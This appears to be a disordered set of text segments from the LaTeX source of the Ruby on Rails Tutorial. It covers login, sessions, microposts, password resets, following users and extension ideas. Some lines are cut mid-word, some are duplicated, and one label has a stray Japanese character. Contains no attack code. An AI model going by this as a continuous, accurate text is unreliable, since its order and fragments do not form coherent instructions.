ge.<n>%= <span class='exercise' id='ex-2e6353'></span><n>\end{enumerate}<n><n>  % subsection a_flash_test (end)<n><n>  % section login_failure (end)<n><n>  \section{Logging in} % (fold)<n>  \label{sec:logging_in}<n><n>
te}<n><n>    % subsection a_working_log_in_method (end)<n><n><n>\subsection{Current user} % (fold)<n>\label{sec:current_user}<n><n>
ubsection current_user (end)<n><n>    \subsection{Changing the layout links} % (fold)<n>    \label{sec:changing_the_layout_links}<n><n>
n this step (Box~\ref{aside:technical_sophistication}).)<n>%= <span class='exercise' id='ex-df67d8'></span><n>\end{enumerate}<n><n>    % subsection changing_the_layout_links (end)<n><n>    \subsection{Testing layout changes} % (fold)<n>    \label{sec:testing_layout_changes}<n><n>
umerate}<n><n>    % subsection layout_link_tests (end)<n><n>    \subsection{Login upon signup} % (fold)<n>    \label{sec:login_upon_signup}<n><n>
<n>\end{enumerate}<n><n>    % subsection login_upon_signup (end)<n><n>  % section login_success (end)<n><n>  \section{Logging out} % (fold)<n>  \label{sec:logging_out}<n><n>
  end
  else
A generalized \kode{authenticated?} 
Using the generalized \kode{authenticated?} 
in Listing~\ref{code:show_only_とctive_users_exercise}.
To get this to work, we need to define the \kode{password_reset_expired?}
  Initial commit
The MIT License
As long as you retain this notice you
                     WHERE follower_id = :user_id"
as shown in Listing~\ref{code:users_controller_test_login_route}.
PATCH
in Listing~\ref{code:login_upon_signup} and
       route  resources :users
       route  resources :microposts
=> [#<Micropost id: 1, content: "First micropost!", user_id: 1, <n>created_at:
  Loading development environment
  >> Rails.env
  => "development"
  >> Rails.env.development?
  >> Rails.env.test?
  => false
As you can see, Rails provides a \texttt{Rails} object with an \texttt{env} attribute and associated environment boolean methods, so that, for example, \texttt{Rails.env.test?}
  Loading test environment
  => "test"
  => "production"
  >> Rails.env.production?
<n>    <n>  end
  This is the home page for the
  sample application.
  Get help on the Ruby on Rails Tutorial at the
  To get help on this sample app, see the
<n>  | Ruby on Rails Tutorial Sample App
=> #<User:0x225167c @email="mhartl@example.com",<n>@name="Michael Hartl">
<n><n>  $ rails console
A test of \kode{authenticated?} 
Updating \kode{authenticated?} 
Thanks to reader \href{https://twitter.com/colmtuite}{Colm Tuite} for his excellent work in helping to convert the sample application over to the Bootstrap CSS framework.
There are also two common ways to specify a gem version range, which allows us to exert some control over the version used by Rails.
Luckily, the solution is straightforward to implement: we just need to enforce uniqueness at the database level as well as at the model level.
Here we have reused the shared \kode{error\_messages} partial introduced in Section~\ref{sec:signup_error_messages}.
With the \kode{@user} instance variable from Listing~\ref{code:initial_edit_action}, the edit page should render properly, as shown in Figure~\ref{fig:edit_page}.
There's another subtlety to address here: the code \kode{form\_for(@user)} in Listing~\ref{code:user_edit_view} is \emph{exactly} the same as the code in Listing~\ref{code:signup_form}---so how does Rails know to use a \texttt{POST} request for new users and a \texttt{PATCH} for editing users?
This is easy using the named route \kode{edit\_user\_path} from Table~\ref{table:RESTful_users}, together with the handy \kode{current\_user} helper method defined in Listing~\ref{code:persistent_current_user}:
A test for an unsuccessful edit. 
The  \href{http://gravatar.com/}{Gravatar} image-cropping interface, with a picture of \href{http://www.michaelhartl.com/}{some dude}.
Note also the use of \kode{@user.reload} (first seen in Section~\ref{sec:updating_user_objects}) to reload the user's values from the database and confirm that they were successfully updated.
The \kode{update} action needed to get the tests in Listing~\ref{code:successful_edit_test} to pass is similar to the final form of the \kode{create} action (Listing~\ref{code:login_upon_signup}), as seen in Listing~\ref{code:user_update_action}.
Allowing empty passwords on update. 
With the code in this section, the user edit page should be working (Figure~\ref{fig:edit_form_working}), as you can double-check by re-running the test suite, which should now be \passing:
To require users to be logged in, we define a \kode{logged\_in\_user} method and invoke it using \kode{before\_action :logged\_in\_user}, as shown in Listing~\ref{code:authorize_before_filter}.
The login form after trying to access a protected page.
This is easy using the \kode{log\_in\_as} helper developed in Section~\ref{sec:remember_tests} (Listing~\ref{code:test_helper_log_in}), as shown in Listing~\ref{code:edit_tests_logged_in}.
(We could eliminate some duplication by putting the test login in the \kode{setup} method of Listing~\ref{code:edit_tests_logged_in}, but in Section~\ref{sec:friendly_forwarding} we'll change one of the tests to visit the edit page \emph{before} logging in, which isn't possible if the login step happens during the test setup.)
Commenting out the before filter to test our security model. 
To get it to \passing, just uncomment the before filter (Listing~\ref{code:uncommented_before_filter}).
With that, our test suite should be \passing:
By using the \kode{log\_in\_as} method defined in Listing~\ref{code:test_helper_log_in}, we can test the \kode{edit} and \kode{update} actions as in Listing~\ref{code:edit_update_wrong_user_tests}.
Note that we expect to redirect users to the root path instead of the login path because a user trying to edit a different user would already be logged in.
At this point, our test suite should be \passing:
Here the storage mechanism for the forwarding URL is the same \kode{session} facility we used in Section~\ref{sec:a_working_log_in_method} to log the user in.
The \kode{store\_location} method in Listing~\ref{code:friendly_forwarding_code} puts the requested URL in the \kode{session} variable under the key \kode{:forwarding\_url}, but only for a \kode{GET} request.
As usual, it's a good idea to verify that the test suite is \passing\ before proceeding:
With that, the users index is fully functional, with all tests \passing:
The users index page with only one user.
The users index page with 100 sample users.
Page 2 of the users index.
A test of the users index, including pagination. 
The result should be a \passing\ test suite:
The first step in our refactoring is to replace the user~\kode{li} from Listing~\ref{code:will_paginate_index_view} with a \kode{render} call (Listing~\ref{code:index_view_first_refactoring}).
This is a definite improvement, but we can do even better: we can call \kode{render} \emph{directly} on the \kode{@users} variable (Listing~\ref{code:index_final_refactoring}).
As with any refactoring, you should verify that the test suite is still \passing\ after changing the application code:
The User model with an added \kode{admin} boolean attribute.
Note that we've added the argument \kode{default: false} to \kode{add\_column} in Listing~\ref{code:admin_migration}, which means that users will \emph{not} be administrators by default.
At this point, our deletion code is well-tested, and the test suite should be \passing:
Ruby on Rails Tutorial
The \kode{current_user?} 
We’ve also wrapped each link inside an \texttt{if} statement so that only admins can see them.
The Micropost data model.
The \kode{belongs\_to} relationship between a micropost and its associated user.
The \kode{has\_many} relationship between a user and its microposts.
A summary of user/micropost association methods.
With the association thus made, we can update the \kode{setup} method in Listing~\ref{code:micropost_validity_test} with the idiomatically correct way to build a new micropost, as shown in Listing~\ref{code:micropost_validity_test_idiomatic}.
If the code in Listing~\ref{code:micropost_dependency} is working correctly, the test suite should still be \passing:
A mockup of a profile page with microposts.
Note the use of \kode{if @user.microposts.any?}\ (a construction we saw before in Listing~\ref{code:errors_partial}), which makes sure that an empty list won't be displayed when the user has no microposts.
The user profile page with code for microposts---but no microposts.
The user profile with unstyled microposts.
In all three cases, observe that each micropost display indicates the time since it was created (e.g., ``Posted 1 minute ago.''); this is the work of the \kode{time\_ago\_in\_words} method from Listing~\ref{code:micropost_partial}.
Note the use of the \kode{full\_title} helper from Listing~\ref{code:title_helper} to test the page's title, which we gain access to by including the Application Helper module into the test
If you'd like to refactor other tests to use \kode{full\_title} (such as those in Listing~\ref{code:base_title_test}), you should include the Application Helper in \kode{test\_helper.rb} instead.
A test for the user profile. 
Of course, this simplicity is a sign of being \emph{more} advanced, not less---we've come a long way since our reliance on scaffolding in Chapter~\ref{cha:a_toy_app}, and we no longer need most of its complexity.
RESTful routes provided by the Microposts resource in Listing~\ref{code:microposts_resource}.
A mockup of the Home page with a form for creating microposts.
as seen in Listing~\ref{code:microposts_create_action}.
In the present case, though, saying ``1 microposts'' is ungrammatical, so we arrange to display ``1 micropost'' and ``2 microposts'' using the \kode{pluralize} method we saw in Section~\ref{sec:signup_error_messages}.
The Home page with a new micropost form.
The Home page with a form error.
It would be far better to have a \emph{feed} of microposts that includes the user's own posts, as mocked up in Figure~\ref{fig:proto_feed_mockup}.
A mockup of the Home page with a proto-feed.
We've used the code in Listing~\ref{code:proto_status_feed} instead because it generalizes much more naturally to the full status feed needed in Chapter~\ref{cha:following_users}.
The Home page with a proto-feed.
The Home page after creating a new micropost.
A mockup of the proto-feed with micropost delete links.
Note that the \kode{destroy} method in Listing~\ref{code:microposts_destroy_action} redirects to the URL
The Home page after deleting the second-most-recent micropost.
Because we wrote working application code first, the test suite should be \passing:
On some systems, you may need to restart the Rails server at this point to keep the test suite \passing.
The valid formats consist of the \href{https://en.wikipedia.org/wiki/Internet_media_type}{MIME types} accepted by the validation in  Listing~\ref{code:validate_picture_format}.
The image uploader developed in Section~\ref{sec:image_resizing} is good enough for development, but (as seen in the \kode{storage :file} line in Listing~\ref{code:image_uploader_resizing}) it uses the local filesystem for storing the images, which isn't a good practice in production
To configure our application to use cloud storage in production, we'll use the \texttt{fog} gem, as shown in Listing~\ref{code:image_uploader_production}.
The \kode{current\_user?} 
error
This is the first application for
the<n>[*Ruby on Rails Tutorial*](http://railstutorial.jp/)
(It's probably a good idea to write a test for the flash as well, which is left as an exercise (Section~\ref{sec:exercises_the_flash}).)
Because we'll need forms both for creating new password resets (Figure~\ref{fig:forgot_password_form_mockup}) and for updating them by changing the password in the User model (Figure~\ref{fig:reset_password_form_mockup}), we need routes for \kode{new}, \kode{create}, \kode{edit}, and \kode{update}.
As you proceed through this tutorial, in all likelihood you will occasionally be tripped up by things not immediately working as expected.
Although some particularly tricky steps are explicitly highlighted in the text, it is impossible to anticipate all the things that can go wrong.
I recommend you embrace these inevitable stumbling blocks as opportunities to work on improving your technical sophistication.
The code in Listing~\ref{code:user_index_view} uses the result of Listing~\ref{code:gravatar_option_redux} from Section~\ref{sec:signup_exercises}, which allows us to pass an option to the Gravatar helper specifying a size other than the default.
nt prerequisites (especially \ler, \les, and \lera).<n><n>  \section{Showing users} % (fold)<n>  \label{sec:showing_users}<n><n>
te}<n><n>    % subsection rails_environments (end)<n><n>    \subsection{A Users resource} % (fold)<n>    \label{sec:a_users_resource}<n><n>
te}<n><n>    % subsection a_users_resource (end)<n><n>\subsection{Debugger} % (fold)<n>\label{sec:debugger}<n><n>
bsection debugger (end)<n><n>    \subsection{A Gravatar image and a sidebar} % (fold)<n>    \label{sec:a_gravatar_image}<n><n>
ice?<n>%= <span class='exercise' id='ex-d0bbfe'></span><n>\end{enumerate}<n><n>    % subsection using_form_for (end)<n><n>    \subsection{Signup form HTML} % (fold)<n>    \label{sec:the_form_html}<n><n>
umerate}<n><n>    % subsection the_form_html (end)<n><n>  \section{Unsuccessful signups} % (fold)<n>  \label{sec:unsuccessful_signups}<n><n>
te}<n><n>    % subsection the_finished_signup_form (end)<n><n>    \subsection{The flash} % (fold)<n>    \label{sec:the_flash}<n><n>
<n><n>    % subsection the_first_signup (end)<n><n>\subsection{A test for valid submission} % (fold)<n>\label{sec:a_test_for_valid_submission}<n><n>
Commit
ActionView::MissingTemplate:
As with model inheritance, both the Users and Microposts controllers gain a large amount of functionality by inheriting from a base class (in this case, \kode{ActionController::Base}), including the ability to manipulate model objects, filter inbound HTTP requests, and render views as HTML. Since all Rails controllers inherit from \kode{ApplicationController}, rules defined in the Application controller automatically apply to every action in the application.
The result appears in Figure~\ref{fig:sqlite_database_browser}); compare with the diagram in Figure~\ref{fig:user_model_initial}.
I thus have a strong preference for including multiple assertions in a test, relying on Ruby (via MiniTest) to tell me the exact lines of any failed assertions.
As with ``Ctrl-C'', the convention is to write ``Ctrl-D'' even though it's really ``Ctrl-d''.
(Including \kode{new} actually generates \emph{views} as well, which is why we don't include actions like \kode{create} and \kode{delete} that don't correspond to views.)
in Listing~\ref{code:log_out_with_forget}.
The second subtlety is that a user could be logged in (and remembered) in multiple browsers, such as Chrome and Firefox, which causes a problem if the user logs out in one browser but not the other
In contrast, inside Chrome the \kode{user\_id} cookie hasn't been deleted, so \kode{user\_id} will be \kode{true} in a boolean context and the corresponding user will be found in the database:
Use of the Rails ``default stack'', including the built-in MiniTest testing framework
There are no formal prerequisites to this book---the \emph{Ruby on Rails Tutorial} contains integrated tutorials not only for Rails, but also for the underlying Ruby language, the default Rails testing framework (MiniTest), the Unix command line, \href{http://en.wikipedia.org/wiki/HTML}{HTML}, \href{http://en.wikipedia.org/wiki/CSS}{CSS}, a small amount of \href{http://en.wikipedia.org/wiki/JavaScript}{JavaScript}, and even a little \href{http://en.wikipedia.org/wiki/SQL}{SQL}.
(Including \kode{new} actually generates \emph{views} as well, which is why we don't include actions like \kode{create} and \kode{delete} that don't correspond to views.)
Note that Listing~\ref{code:rails_command} explicitly includes the Rails version number (\kode{\_4.2.0\_}) as part of the command.
It's really ``Ctrl-c''---there's no need to hold down the Shift key to get a capital ``C''---but for some reason it's always written as ``Ctrl-C''.
Git is a large subject, and we'll only be scratching the surface in this book, but there are many good free resources online; I especially recommend \href{https://confluence.atlassian.com/display/BITBUCKET/Clone+your+Git+repository+and+add+source+files}{Bitbucket 101} for a short overview and \href{http://git-scm.com/book}{\emph{Pro Git}} by Scott Chacon for a book-length introduction.
in Listing~\ref{code:remember_me_ternary}.
The \kode{followed} association isn't actually needed until Section~\ref{sec:followers}, but the parallel follower/followed structure is clearer if we implement them both at the same time.
The fixtures in Listing~\ref{code:relationships_fixtures} first arrange for Michael to follow Lana and Mallory, and then arrange for Michael to be followed by Lana and Archer.
as shown in Listing~\ref{code:gitignore_uploads}.
(\emph{Note}: If you completed the exercise corresponding to Listing~\ref{code:base_title_test}, you should retain the \kode{setup} method defining the \kode{@base\_title} variable.)
It's worth noting that the \kode{nil} object is special, in that it is the \emph{only} Ruby object that is false in a boolean context, apart from \kode{false} itself:
Next, why does the \kode{data-turbolinks-track} key/value pair use the old-style hashrocket syntax?
as shown in Listing~\ref{code:micropost_order_test}.
(This is our first example of the notion of \emph{scope}.
in Listing~\ref{code:micropost_ordering}.
If you wait a couple minutes and reload the pages, you'll see how the text gets automatically updated based on the new time.
in Listing~\ref{code:microposts_controller_access_control}.
As seen in Listing~\ref{code:mail_account_activation}, the \kode{mail} method also takes a \kode{subject} key, whose value is used as the email's subject line.
# This is preliminary.
See "Following users" for the full implementation.
After restarting the development server to activate the configuration in Listing~\ref{code:development_email_settings}, we next need to update the User mailer \emph{preview file}, which was automatically generated in Section~\ref{sec:account_activations_resource}, as shown in Listing~\ref{code:generated_user_mailer_previews}.
There is one subtlety, though: on \emph{failed} micropost submission, the Home page expects an \kode{@feed\_items} instance variable, so failed submissions currently break (as you should be able to verify by running your test suite).
The test appears in Listing~\ref{code:micropost_interface_test}.
as shown in Listing~\ref{code:generalized_current_user}.
The valid formats consist of the \href{https://en.wikipedia.org/wiki/Internet_media_type}{MIME types} accepted by the validation in  Listing~\ref{code:micropost_model_image_validation}.
The result appears in Listing~\ref{code:new_password_reset}
as seen in Listing~\ref{code:user_model_password_reset}.
in \linebreak Listing~\ref{code:generalized_authenticated_p}.
as shown in Listing~\ref{code:password_reset_edit_action}.
in Listing~\ref{code:sessions_resource}.
/sessions
create a new session
(A second option is to use \kode{form\_tag} in place of \kode{form\_for}; this might be even more idiomatically correct Rails, but it has less in common with the signup form, and at this stage I want to emphasize the parallel structure.
in Listing~\ref{code:login_form_html}.
<div>
Recalling that \kode{authenticate} returns \kode{false} for an invalid authentication (Section~\ref{sec:creating_and_authenticating_a_user}), our strategy for user login can be summarized as shown in Listing~\ref{code:find_authenticate_user}.
Because of the flash message display in the site layout (Listing~\ref{code:layout_flash}), the \kode{flash[:danger]} message automatically gets displayed; because of the Bootstrap CSS, it automatically gets nice styling (Figure~\ref{fig:failed_login_flash}).
With the \kode{log\_in} method defined in Listing~\ref{code:log_in_success}, we're now ready to complete the session \kode{create} action by logging the user in and redirecting to the user's profile page.
Finally, we'll add a profile link as follows:
as shown in Listing~\ref{code:layout_login_logout_links}.
The result appears in Listing~\ref{code:destroy_session}
in Listing~\ref{code:add_remember_digest_to_users}.
where \kode{cookies.signed[:user\_id]} automatically decrypts the user id cookie.
Of course, \kode{cookies} isn't \emph{really} a hash, since assigning to \kode{cookies} actually \emph{saves} a piece of text on the browser, but part of the beauty of Rails is that it lets you ignore that detail and concentrate on writing the application.
In the course of developing the core sample application, we've now encountered four resources---users, sessions, account activations, and password resets---but only the first of these is backed by an Active Record model with a table in the database.
Using the \kode{belongs\_to}/\kode{has\_many} association defined in this section, Rails constructs the methods shown in Table~\ref{table:association_methods}.
as shown in Listing~\ref{code:log_out_with_forget}.
Unfortunately, this orders the results in \emph{ascending} order from smallest to biggest, which means that the oldest microposts come out first.
In the present case, this function is
in Listing~\ref{code:user_logout_test}.
Our plan is to display the microposts for each user on their respective profile page (\kode{show.html.erb}), together with a running count of how many microposts they've made.
We'll define an analogous \kode{\_micropost.html.erb} partial so that we can use the same technique on a collection of microposts as follows:
as shown in Listing~\ref{code:branch_no_raise}.
in Listing~\ref{code:remember_method}.
As indicated in Section~\ref{sec:remember_me_checkbox}, as the application is currently designed there's no way to access the virtual \kode{remember\_token} attribute in the integration test in Listing~\ref{code:remember_me_test}.
in Listing~\ref{code:login_create_user_instance} and
Note that we haven't restricted the actions the before filter applies to since it applies to them both by default.
As with the Users resource, we'll use an integration test:
Our strategy for handling account activation parallels user login (Section~\ref{sec:logging_in}) and especially remembering users (Section~\ref{sec:remember_me}).
as shown in Listing~\ref{code:activation_digest_test}.
in Listing~\ref{code:generated_account_activation_view_text} and
The feed item partial with added delete link.
In this case, we use \kode{find\_by} instead of \kode{find} because the latter raises an exception when the micropost doesn't exist instead of returning \kode{nil}.
By the way, if you're comfortable with exceptions in Ruby, you could also write the \kode{correct\_user} filter like this:
rescue
It might occur to you that we could implement the \kode{correct\_user} filter using the \kode{Micropost} model directly, like this:
in Listing~\ref{code:development_email_settings}.
To get started, we need to include the \texttt{carrierwave} gem in the \kode{Gemfile} (Listing~\ref{code:gemfile_carrierwave}).
Adding CarrierWave to the \kode{Gemfile}.
Based on this discussion of \kode{send}, we can rewrite the current \kode{authenticated?}\ method as follows:
Applying this discussion to the User model yields the generalized \kode{authenticated?}\ method shown in Listing~\ref{code:generalized_authenticated_p}.
For reference, the final \kode{Gemfile} is shown in Listing~\ref{code:final_gemfile}.
(We could have switched from \kode{user} to \kode{self}, but recall from Section~\ref{sec:the_caveat} that \kode{self} is optional inside the model.)
Add tests for the sidebar micropost counts (including proper pluralization).
Add tests for micropost pagination.
Write a test to make sure delete links do not appear for microposts not created by the current user.
in Listing~\ref{code:wrap}.
Note the use of the \kode{raw} method to prevent Rails from escaping the resulting HTML, together with the \kode{sanitize} method needed to prevent cross-site scripting.
in Listing~\ref{code:password_resets_resource}.
The result appears in Listing~\ref{code:password_reset_test}
from Listing~\ref{code:password_reset_form} to
To get this to work, we need to define the \kode{password\_reset\_expired?}\ method.
For example, when searching for a file called ``Gemfile'', six possibilities will show up, because each project has matching files called \kode{Gemfile} and \kode{Gemfile.lock}.
As in Section~\ref{sec:planning_the_application}, our next step is to use a text editor to update the \kode{Gemfile} with the gems needed by our application.
A \kode{Gemfile} for the sample app.
In case you've previously installed a version of a gem (such as Rails itself) other than the one specified by the \kode{Gemfile}, it's a good idea to \emph{update} the gems with \kode{bundle update} to make sure the versions match:
as shown in Listing~\ref{code:sample_app_readme}.
Then change it to use the Markdown extension~\kode{.md} and commit the changes:
If you take another look at the output in Listing~\ref{code:generating_pages}, you might be able to guess the correspondence between actions and views: an action like \kode{home} has a corresponding view called \kode{home.html.erb}.
(You won't actually see the color green unless you add MiniTest reporters in the optional Section~\ref{sec:minitest_reporters}.)
Ruby on Rails Tutorial Sample App |
We can see how this works by replacing the literal title ``Home'' in the \kode{home.html.erb} view with the code in Listing~\ref{code:home_view_erb_title}.
In this chapter, we will complete the core sample application by adding a social layer that allows users to follow (and unfollow) other users, resulting in each user's Home page displaying a status feed of the followed users' microposts.
We will also make views to display both a user's followers and the users each user is following.
(Now you know why HTML views have the file extension \kode{.html.erb}.)
There is a second popular template system called \href{http://haml-lang.com/}{Haml}, which I personally love, but it's not \emph{quite} standard enough yet for use in an introductory tutorial.
It's likely that many of the ideas in this section won't seem obvious at first, and it may take a while for the rather complicated data model to sink in.
If you find yourself getting confused, try pushing forward to the end; then, read the section a second time through to see if things are clearer.
Using Rails' default pluralization convention, the set of all users following a given user is that user's \emph{followers}, and \kode{user.followers} is an array of those users.
In order to factor out this common structure, Rails comes with a special \emph{layout} file called \kode{application.html.erb}, which we renamed in the beginning of this section (Section~\ref{sec:slightly_dynamic_pages}) and which we'll now restore:
We will add a uniqueness validation to the Relationship model, but because it is \emph{always} an error to create duplicate relationships, the unique index is sufficient for now.
To create the \kode{relationships} table, we migrate the database and prepare the test database as usual:
Before implementing followed users and followers, we first need to establish the association between users and relationships.
in Listing~\ref{code:user_relationships_association} and
(Note that, with the code in Listing~\ref{code:home_root_route}, the previous route \kode{static\_pages/home} will no longer work.)
Follow the \href{http://devcenter.heroku.com/articles/local-postgresql}{Heroku instructions for local PostgreSQL installation} to install the PostgreSQL database on your local system.
as shown in Listing~\ref{code:Gemfile_pg_gem}.
You will also have to learn about the \kode{config/database.yml} file and how to run PostgreSQL locally.
as shown in Listing~\ref{code:gitignore}.
Your goal should be to create and configure both the development database and the test database to use PostgreSQL.
I especially recommend using \href{http://inductionapp.com/}{Induction} to connect to and view the local PostgreSQL database.
If you get stuck, don't hesitate to skip it; as noted previously, the sample application developed in this tutorial is fully compatible with both SQLite and PostgreSQL.
The final piece of the relationships puzzle is to add a \kode{user.followers} method to go with \kode{user.following}.
Indeed, the technique is exactly the same as for followed users, with the roles of \kode{follower\_id} and \kode{followed\_id} reversed, and with \kode{passive\_relationships} in place of \kode{active\_relationships}.
It's worth noting that we could actually omit the \kode{:source} key for \kode{followers} in Listing~\ref{code:has_many_following_through_passive_relationships}, using simply
Even better, we can configure Guard so that when, say, the \kode{home.html.erb} file is modified, the \kode{static\_pages\_controller\_test.rb} automatically runs.
The \kode{Gemfile} in Listing~\ref{code:gemfile_sample_app} has already included the \texttt{guard} gem in our application, so to get started we just need to initialize it:
The unfortunate hybrid usage in the ``following'' route is forced by our choice to use the unambiguous ``followed users'' terminology along with the ``following'' usage from Twitter.
as shown in Listing~\ref{code:following_followers_authorization_test}.
in Listing~\ref{code:following_followers_tests}.
# Ruby on Rails Tutorial: sample application
Ruby on Rails<n>Tutorial
It's best not to rely on that, though, so we've taken the extra step and added an extra layer of security.
First, we will need to know about the dollar-sign syntax to access a DOM element based in its unique CSS~id.
We come now to the pinnacle of our sample application: the status feed.
in Listing~\ref{code:full_feed_test}.
as shown in Listing~\ref{code:user_feed}.
Adding the completed feed to the User model.
Here, we expect it to be more complicated, something like
is automatically converted to
We've also omitted the leading \kode{Micropost.}\ since we expect this method to live in the Micropost model itself.)
by itself.
How cool is that?
This means we can use
in Listing~\ref{code:from_users_followed_by_first_cut}.
A first cut at the \kode{from\_users\_followed\_by} method.
In some applications, this initial implementation might be good enough for most practical purposes, but Listing~\ref{code:from_users_followed_by_first_cut} isn't the final implementation; see if you can make a guess about why not before moving on to the next section.
pulls \emph{all} the followed users' ids into memory, and creates an array the full length of the followed users array.
Since the condition in Listing~\ref{code:from_users_followed_by_first_cut} actually just checks inclusion in a set, there must be a more efficient way to do this, and indeed SQL is optimized for just such set operations.
We'll start by refactoring the feed with the slightly modified code in Listing~\ref{code:from_users_followed_by_second_cut}.
Improving \kode{from\_users\_followed\_by}.
# Returns microposts from the users being followed by the given user.
          following
<n>      following
For a more advanced way to create the necessary subselect, see the blog post \href{http://pivotallabs.com/users/jsusser/blog/articles/567-hacking-a-subselect-in-activerecord}{``Hacking a subselect in ActiveRecord''.}
as seen in Listing~\ref{code:from_users_followed_by_final}.
The final implementation of \kode{from\_users\_followed\_by}.
"Ruby on Rails Tutorial Sample App | Home"
With the code in Listing~\ref{code:from_users_followed_by_final}, our status feed is now complete.
"Ruby on Rails Tutorial Sample App | About"
In Chapter~\ref{cha:user_microposts}, the result was only a proto-feed (Figure~\ref{fig:home_with_proto_feed}), but with the implementation in Listing~\ref{code:from_users_followed_by_final} as seen in Figure~\ref{fig:home_page_with_feed} the Home page now shows the full feed.
With the addition of the status feed, we've finished the core sample application for the \emph{Ruby on Rails Tutorial}.
Despite this impressive list, there is still much to learn about Rails.
The proposed extensions in this section are mostly inspired either by general features common to web applications, such as password reminders and email confirmation, or features specific to our type of sample application, such as search, replies, and messaging.
Implementing one or more of these application extensions will help you make the transition from following a tutorial to writing original applications of your own.
Don't be surprised if it's tough going at first; the blank slate of a new feature can be quite intimidating.
To help get you started, I can give two pieces of general advice.
First, before adding any feature to a Rails application, take a look at the \href{http://railscasts.com/episodes/archive}{RailsCasts archive} to see if Ryan Bates has already covered the subject
Note that RailsCasts usually omit the tests, which is probably necessary to keep the episodes nice and short, but you could get the wrong idea about the importance of testing.
Once you've watched the relevant RailsCast to get a basic idea of how to proceed, I suggest writing the new feature using test-driven development.
(In this context, I recommend taking a look at \href{http://railscasts.com/episodes/275-how-i-test}{the RailsCast on ``How I test''}.
You'll see that Ryan Bates himself often uses TDD for real-life development, and in fact his testing style is similar to the style used in this tutorial.)
If he has, watching the relevant RailsCast first will often save you a ton of time.
Second, always do extensive Google searches on your proposed feature to find relevant blog posts and tutorials.
Web application development is hard, and it helps to learn from the experience (and mistakes) of others.
Many of the following features are quite challenging, and I have given some hints about the tools you might need to implement them.
Even with hints, they are \emph{much} more difficult than the book's end-of-chapter exercises, so don't be discouraged if you can't solve them without considerable effort.
Twitter allows users to make ``@replies'', which are microposts whose first characters are the user's login preceded by the \texttt{@}~sign.
These posts only appear in the feed of the user in question or users following that user.
Implement a simplified version of this, restricting @replies to appear only in the feeds of the recipient and the sender.
This might involve adding an \kode{in\_reply\_to} column in the \kode{microposts} table and an extra \kode{including\_replies} scope to the Micropost model.
Since our application lacks unique user logins, you will also have to decide on a way to represent users.
One option is to use a combination of the id and the name, such as \kode{@1-michael-hartl}.
Another is to \emph{add} a unique username to the signup process and then use it in @replies.
Twitter supports direct (private) messaging by prefixing a micropost with the letter~``d''.
Implement this feature for the sample application.
The solution will probably involve a Message model and a regular expression match on new microposts.
Follower notifications
Implement a feature to send each user an email notification when they gain a new follower.
Then make the notification optional, so that users can opt out if desired.
Among other things, adding this feature requires learning how to send mail with Rails.
To get started, I suggest viewing the \href{http://railscasts.com/episodes/206-action-mailer-in-rails-3}{RailsCast on Action Mailer in Rails~3}.
Password reminders
Currently, if our application's users forget their passwords, they have no way to retrieve them.
Signup confirmation
Apart from an email regular expression, the sample application currently has no way to verify the validity of a user's email address.
Add an email address verification step to confirm a user's signup.
The new feature should create users in an inactive state, email the user an activation URL, and then change the user to an active state when the URL gets hit.
You might want to read up on \href{http://www.google.com/search?q=state+machines+in+rails}{state machines in Rails} to help you with the inactive/active transition.
RSS feed
For each user, implement an RSS feed for their microposts.
Then implement an RSS feed for their status feed, optionally restricting access to that feed using an authentication scheme.
The \href{http://railscasts.com/episodes/87-generating-rss-feeds}{RailsCast on generating RSS feeds} will help get you started.
REST API
Many websites expose an Application Programmer Interface (API) so that third-party applications can get, post, put, and delete the application's resources.
Implement such a REST API for the sample application.
Be careful about security; the API should only be accessible to authorized users.
Currently, there is no way for users to find each other, apart from paging through the user index or viewing the feeds of other users.
Implement a search feature to remedy this.
Then add another search feature for microposts.
The \href{http://railscasts.com/episodes/37-simple-search-form}{RailsCast on simple search forms} will help get you started.
If you deploy using a shared host or a dedicated server, I suggest using \href{http://freelancing-god.github.com/ts/en/}{Thinking Sphinx} (following the \href{http://railscasts.com/episodes/120-thinking-sphinx}{RailsCast on Thinking Sphinx}).
If you deploy on Heroku, you should follow the \href{http://devcenter.heroku.com/articles/full-text-search}{Heroku full text search} instructions.
There are a wealth of Rails resources in stores and on the web---indeed, the supply is so rich that it can be overwhelming.
\href{http://railslab.newrelic.com/scaling-rails}{Scaling Rails}: One topic we've hardly covered in the \emph{Ruby on Rails Tutorial} book is performance, optimization, and scaling.
Luckily, most sites will never run into serious scaling issues, and using anything beyond plain Rails is probably premature optimization.
If you do run into performance issues, the \href{http://railslab.newrelic.com/scaling-rails}{Scaling Rails} series from Gregg Pollack of \href{http://envylabs.com/}{Envy Labs} is a good place to start.
I also recommend investigating the site monitoring applications \href{http://scoutapp.com/}{Scout} and \href{http://www.newrelic.com/}{New Relic}
In addition to being a clever phrase---\emph{new relic} being a contradiction in terms---New Relic is also an anagram for the name of the company's founder, Lew Cirne.
And, as you might suspect by now, there are RailsCasts on many scaling subjects, including profiling, caching, and background jobs.
in Listing~\ref{code:micropost_dependency_test}.
Refactor
      Contents
in Listing~\ref{code:home_feed_test}.
Next, we'll use a text editor to update the \kode{Gemfile} needed by Bundler with the contents of Listing~\ref{code:demo_gemfile_sqlite_version_redux}.
Note that, in order to ensure that the command uses the version of Rake corresponding to our \kode{Gemfile}, we need to run \kode{rake} using \kode{bundle exec}.
For example, the page for listing all users is at \href{http://0.0.0.0:3000/users}{/users}, and the<n>page for making a new user is at \href{http://0.0.0.0:3000/users/new}{/users/new}.
We start with the page to show all the users in our application, called \href{http://0.0.0.0:3000/users}{\texttt{index}}; as you might expect, initially there are no users at all (Figure~\ref{fig:demo_blank_user_index_rails_3}).
The initial index page for the Users resource (\href{http://0.0.0.0:3000/users}{/users}).
To make a new user, we visit the \href{http://0.0.0.0:3000/users/new}{\texttt{new}} page, as shown in Figure~\ref{fig:demo_new_user_rails_3}.
The new user page (\href{http://0.0.0.0:3000/users/new}{/users/new}).
The result is the user \href{http://0.0.0.0:3000/users/1}{\texttt{show}} page, as seen in Figure~\ref{fig:demo_show_user_rails_3}.
Note that the URL is \href{http://0.0.0.0:3000/users/1}{/users/1}; as you might suspect, the number~\kode{1} is simply the user's~\kode{id} attribute from Figure~\ref{fig:demo_user_model}.
The page to show a user (\href{http://0.0.0.0:3000/users/1}{/users/1}).
To change a user's information, we visit the \href{http://0.0.0.0:3000/users/1/edit}{\texttt{edit}} page (Figure~\ref{fig:demo_edit_user_rails_3}).
The user edit page (\href{http://0.0.0.0:3000/users/1/edit}{/users/1/edit}).
